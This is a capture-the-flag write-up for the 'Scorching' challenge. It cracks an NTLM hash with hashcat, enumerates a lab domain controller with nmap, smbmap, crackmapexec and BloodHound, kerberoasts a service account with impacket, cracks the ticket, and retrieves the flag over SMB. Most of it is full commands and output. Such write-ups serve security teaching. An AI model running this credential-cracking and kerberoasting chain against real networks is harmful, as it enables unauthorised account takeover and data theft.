# Scorching

![](Pasted%20image%2020210809214455.png)

hash.txt file provided contains an NTLM hash:
```
aad3b435b51404eeaad3b435b51404ee:b269f3bb4933d8aa6597cfd2de75397e
```

From experience, we recognized the NTLM hash pretty quickly due to the "aad3b435b51404eeaad3b435b51404ee" string (ie. 'empty'/no password) and approximate length of the hash.

These are the type of hashes you may retrieve from SAM files on windows.

The first part of the challenge is to crack the hash. We use hashid to find the hashcat mode id:
```
% hashid "b269f3bb4933d8aa6597cfd2de75397e" -m
Analyzing 'b269f3bb4933d8aa6597cfd2de75397e'
[+] MD2
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]
```

When we originally tried the challenge, we didn't bother creating a mask for it and instead bruteforced it with a cracking machine. It took just a few seconds on it.

Doing it the smart way, we can use a mask to bruteforce 8 char password with a capital letter at the start and a number at the end of the password. This is a good mask to try considering the hint:
> The password does not meet the password complexity policy as it is less than 8 characters and only includes letters and numbers.

We use hashcat to bruteforce it and find that the password is `H4cky21`:
```
% hashcat -m 1000 hash.txt -O -a 3 -1 "?l?u?d" "?u?1?1?1?1?1?d" --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8665U CPU @ 1.90GHz, 2048/5918 MB allocatable, 3MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=1000 -D _unroll'
* Device #1: Kernel m01000_a3-optimized.f7d59af1.kernel not found in cache! Building may take a while...
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: NTLM
Hash.Target......: b269f3bb4933d8aa6597cfd2de75397e
Time.Started.....: Mon Aug  9 21:58:00 2021 (3 secs)
Time.Estimated...: Mon Aug  9 22:09:13 2021 (11 mins, 10 secs)
Guess.Mask.......: ?u?1?1?1?1?1?d [7]
Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   353.3 MH/s (6.11ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 1148878848/238194536320 (0.48%)
Rejected.........: 0/1148878848 (0.00%)
Restore.Point....: 712704/147763360 (0.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1024 Iteration:0-1024
Candidates.#1....: M09Pz20 -> TdCC030

b269f3bb4933d8aa6597cfd2de75397e:H4cky21

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: b269f3bb4933d8aa6597cfd2de75397e
Time.Started.....: Mon Aug  9 21:58:00 2021 (1 min, 11 secs)
Time.Estimated...: Mon Aug  9 21:59:11 2021 (0 secs)
Guess.Mask.......: ?u?1?1?1?1?1?d [7]
Guess.Charset....: -1 ?l?u?d, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   342.1 MH/s (6.27ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 24966500352/238194536320 (10.48%)
Rejected.........: 0/24966500352 (0.00%)
Restore.Point....: 15485952/147763360 (10.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1024 Iteration:0-1024
Candidates.#1....: M06by21 -> TdVOz21

Started: Mon Aug  9 21:57:45 2021
Stopped: Mon Aug  9 21:59:13 2021
```

The flag for part 1 is the password itself:  `H4cky21`

![](Pasted%20image%2020210809214631.png)

For the second part of the challenge, we have to retrieve a hidden file in the shared directory of the "SAccount" user.

A vulnerable DC is spun up for us to interact with as explained in the challenge description:
```
Windows domains are hot. Scorching even. Note: a domain controller is spun up on-demand. It may take a while to fully boot upon launch. Verify whether it's online by checking if port 445 is open on 10.6.0.2.
```

_Note: When we did the challenge originally, PrintNightmare was just released and so we thought maybe they hadn't patched it and we could abuse it to get RCE. And it worked! Although, it was definitely not the intended solution as they fixed it during the final release of the CTF... I won't explain how you can exploit it using PrintNightmare since the Dreams challenge is about exploiting a DC using PrintNightmare. You can read the writeup I've made for that challenge if you want to learn about it._

We start with a quick nmap scan to check what ports are open and find that the usual windows ports  such as SMB and RCP are open. Since this is a DC it's not surprising to see kerberos and LDAP are also open. We also get the hostname "insecureAD.local":
```
 % nmap -p- 10.6.0.2 -v -Pn --min-rate=1000
[...redacted...]
Completed Connect Scan at 22:50, 68.47s elapsed (65535 total ports)
Nmap scan report for insecureAD.local (10.6.0.2)
Host is up (0.33s latency).
Not shown: 65507 closed ports
PORT      STATE    SERVICE
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
[...redacted...]

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 68.56 seconds
```

Using the credential identified in part 1 (NAccount:H4cky21), we can check the shares accessible by the NAccount user. We find nothing useful:
```
% smbmap -u 'NAccount' -p 'H4cky21' -H 10.6.0.2
[+] IP: 10.6.0.2:445    Name: insecureAD.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HOME                                                    NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SpaceRace                                               NO ACCESS
        SYSVOL                                                  READ ONLY       Logon server share

```

We can also use crackmapexec to get a list of the users on the box:
```
% crackmapexec smb 10.6.0.2 -u "NAccount" -p "H4cky21" --users
SMB         10.6.0.2        445    DC1              [*] Windows Server 2012 R2 Standard Evaluation 9600 (name:DC1) (domain:insecureAD.local) (signing:True) (SMBv1:True)
SMB         10.6.0.2        445    DC1              [+] insecureAD.local\NAccount:H4cky21
SMB         10.6.0.2        445    DC1              [+] Enumerated domain user(s)
SMB         10.6.0.2        445    DC1              insecureAD.local\Administrator                  badpwdcount: 0 baddpwdtime: 1601-01-01 10:04:52
SMB         10.6.0.2        445    DC1              insecureAD.local\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 10:04:52
SMB         10.6.0.2        445    DC1              insecureAD.local\sshd_server                    badpwdcount: 0 baddpwdtime: 1601-01-01 10:04:52
SMB         10.6.0.2        445    DC1              insecureAD.local\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 10:04:52
SMB         10.6.0.2        445    DC1              insecureAD.local\NAccount                       badpwdcount: 0 baddpwdtime: 2021-07-11 13:11:29.479311
SMB         10.6.0.2        445    DC1              insecureAD.local\SAccount  
```

We update our /etc/hosts file to be able to use `insecureAD.local`  instead of the DC IP in future commands:
```
sudo echo "10.6.0.2 insecureAD.local" >> /etc/hosts
```

From the nmap scan we did earlier, we saw that LDAP was open so we can look at using the credentials to dump the AD Forest and pass it to Bloodhound so we can review it.

Using the `bloodhound.py` Bloodhound ingestor, we can dump AD forest details:
```
% python bloodhound.py -u NAccount  -p H4cky21 -d insecureAD.local -gc insecureAD.local -ns 10.6.0.2 -c all                                                                                        ~/shared/BloodHound.py
INFO: Found AD domain: insecuread.local
INFO: Connecting to LDAP server: dc1.insecuread.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.insecuread.local
INFO: Found 6 users
INFO: Connecting to GC LDAP server: insecureAD.local
Traceback (most recent call last):
  File "bloodhound.py", line 5, in <module>
    bloodhound.main()
[...redacted...]
    raise exception_history[0][0]
ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 110] Connection timed out
(master)⚡ % ls *.json
20210809230416_groups.json  20210809230416_users.json
```

_Note: I got an error while running the command above, however its not worth trying to fix it atm since I only need the users for this challenge._

We can load the json files into bloodhound and run a query on the dataset to find users which are kerberoastable: 
![](Pasted%20image%2020210809231152.png)

We can see that the SAccount is kerberoastable which means we can use kerberoasting to force the DC to send a service ticket which we can then crack offline to retrieve the account's password.

Using the impacket tool `GetUserSPNs.py` we can perform a kerberoasting attack and retrieve the service ticket for the SAccount: 
```
% GetUserSPNs.py -request insecureAD.local/NAccount:H4cky21 -dc-ip 10.6.0.2
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------  --------  --------  --------------------------  ---------  ----------
HTTP/KerberosServer   SAccount            2021-06-30 17:54:47.476509  <never>



$krb5tgs$23$*SAccount$INSECUREAD.LOCAL$HTTP/KerberosServer*$dbb7a276b0f7b8d3fbb9bfad444afb3d$3a3b5ce89f953e3eef4245f85a4adb80a5bd5b85ef3bd6a0590b2fcce55b79e3278fc0a5e0b7e81ecac03fbba08e0e5e50cad9f462311217293066d5553a58430b810bd82555e63b6338c48c7da21c05f889c022a43ab0eec6c288a53d0e1ca9942d2bba58521e825411c89681b04f6dd93efa276c841ef4f511f9d2fdde3d7beaa0b30eed04e84774639c0cc07a1317bd014602c7873817198f4f5eb23e5289da6c8fc9c6fed138d88e3932c2c405b1ba4aa016dcef815d98cb053f589fae57bee465da3cae2c2f838ba96039e55b76ba2e674de2745b1902684c50ebb98dffcdc85a15ce86cb955a77d0dab6c519737f1ffdb01eee1aec5b0f98fe4f4fa86433c19ff4173025e89e868b9aaa5dcbaa67e37f3a8bc286efb4e9bfd6e06676f2d67a07d4adc117aa5477163c300cedcae2af5cea06727b2c654ce8fc4412b2919aa771a5a83a1a510922f877fb7eabcef614fe25e00829a094f8be28d4c68420a501a21062483e2b5bd689e6b390be78d1fe25918e800124092b1296d580b0c14e18bb29a91d5ccf023c8704f21503e765a34e1cd7df7012b07e40e81a8a29478750fa89aa08fcee0c5de95585b9e7dccb9b6784786df80bd15d669cb0796145de1a7b420b665943df1ba505c2f404f6d5b8fd4cff41368034d0e3343158bb0a49e0dea52379504a2a1a8212f4b86ec812942db92f9e6c7001246a007715474837f175d1aeb439adc1427b486b886bab08694b3dc7fef3219ea91e6c35f413fdfac6e3d7a70151d6490c1b9e86ff03ed35d79af1a8c04aa05377cae2b6532cda35370d294648b2bc281df6eaec230d34a286212775285bdefc50c8c1a1b982943791ace8b025cfcf5ab4bc2123be3927bcecc63bf0fd70be01126fa47ba79c851a3dfabfc03afa1c89d2a7be47970167d6de176b3ccdec6cf686f399ed6300e05108758203ee3f3be2750035ac934603169d2a1b83fa7d6ff47d78345e871c539ab11236c2b545d061e8600ce5a16760b69eb6b7a6ffff46ba9941261b182baeba6852028ebcf6ca80550543a34ede78ed4f947af4da6e7b57802940f958ff5ffca4b540abf2adaa122599d4ba85620c1f33223cb46352abfc77488a846454b7ff1fd4ac9e4cffe7b082545cc0468e18434f4b83f4812929553b258606afe85e8f601f336b5a304105c7347c6d90776a834dba3cdce1bd469923d33488fe8b87a03b4a2dc6a1c4643fc033b0529b7173e1eca94d09020f954830334dec30c51f27a631629c001403accb6e55f38c986a5ad4eeff81195b6ed24514adc07afa5dc1e4200e59a81063caf39a06abafe495a7cf52ce1ba2e465a23ea26f25fa1d13d3803bef52237d23d1983e864816d69cc6958789a6e76001d2ad5d84fdb6140fe5
```

We use hashcat to bruteforce the hash using rockyou.txt and find that the password is `MySpace123`:
```
% hashcat -m 13100 --force hash.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*SAccount$INSECUREAD.LOCAL$HTTP/KerberosServer*$dbb7a276b0f7b8d3fbb9bfad444afb3d$3a3b5ce89f953e3eef4245f85a4adb80a5bd5b85ef3bd6a0590b2fcce55b79e3278fc0a5e0b7e81ecac03fbba08e0e5e50cad9f462311217293066d5553a58430b810bd82555e63b6338c48c7da21c05f889c022a43ab0eec6c288a53d0e1ca9942d2bba58521e825411c89681b04f6dd93efa276c841ef4f511f9d2fdde3d7beaa0b30eed04e84774639c0cc07a1317bd014602c7873817198f4f5eb23e5289da6c8fc9c6fed138d88e3932c2c405b1ba4aa016dcef815d98cb053f589fae57bee465da3cae2c2f838ba96039e55b76ba2e674de2745b1902684c50ebb98dffcdc85a15ce86cb955a77d0dab6c519737f1ffdb01eee1aec5b0f98fe4f4fa86433c19ff4173025e89e868b9aaa5dcbaa67e37f3a8bc286efb4e9bfd6e06676f2d67a07d4adc117aa5477163c300cedcae2af5cea06727b2c654ce8fc4412b2919aa771a5a83a1a510922f877fb7eabcef614fe25e00829a094f8be28d4c68420a501a21062483e2b5bd689e6b390be78d1fe25918e800124092b1296d580b0c14e18bb29a91d5ccf023c8704f21503e765a34e1cd7df7012b07e40e81a8a29478750fa89aa08fcee0c5de95585b9e7dccb9b6784786df80bd15d669cb0796145de1a7b420b665943df1ba505c2f404f6d5b8fd4cff41368034d0e3343158bb0a49e0dea52379504a2a1a8212f4b86ec812942db92f9e6c7001246a007715474837f175d1aeb439adc1427b486b886bab08694b3dc7fef3219ea91e6c35f413fdfac6e3d7a70151d6490c1b9e86ff03ed35d79af1a8c04aa05377cae2b6532cda35370d294648b2bc281df6eaec230d34a286212775285bdefc50c8c1a1b982943791ace8b025cfcf5ab4bc2123be3927bcecc63bf0fd70be01126fa47ba79c851a3dfabfc03afa1c89d2a7be47970167d6de176b3ccdec6cf686f399ed6300e05108758203ee3f3be2750035ac934603169d2a1b83fa7d6ff47d78345e871c539ab11236c2b545d061e8600ce5a16760b69eb6b7a6ffff46ba9941261b182baeba6852028ebcf6ca80550543a34ede78ed4f947af4da6e7b57802940f958ff5ffca4b540abf2adaa122599d4ba85620c1f33223cb46352abfc77488a846454b7ff1fd4ac9e4cffe7b082545cc0468e18434f4b83f4812929553b258606afe85e8f601f336b5a304105c7347c6d90776a834dba3cdce1bd469923d33488fe8b87a03b4a2dc6a1c4643fc033b0529b7173e1eca94d09020f954830334dec30c51f27a631629c001403accb6e55f38c986a5ad4eeff81195b6ed24514adc07afa5dc1e4200e59a81063caf39a06abafe495a7cf52ce1ba2e465a23ea26f25fa1d13d3803bef52237d23d1983e864816d69cc6958789a6e76001d2ad5d84fdb6140fe5:MySpace123
```

Finally, we can use the credentials for the `SAccount` to access the hidden shares and retrieve the flag:
```
[1] % smbclient -U "insecureAD\SAccount" \\\\10.6.0.2\\SpaceRace
Enter INSECUREAD\SAccount's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 30 17:54:49 2021
  ..                                  D        0  Wed Jun 30 17:54:49 2021
  Flag.txt                            A       36  Wed Jun 30 17:54:50 2021

                10395647 blocks of size 4096. 5066373 blocks available
smb: \> get Flag.txt
getting file \Flag.txt of size 36 as Flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> ^C
[130] % cat Flag.txt
CTF{Kerberoasting_Flag_SpaceRace} 
```

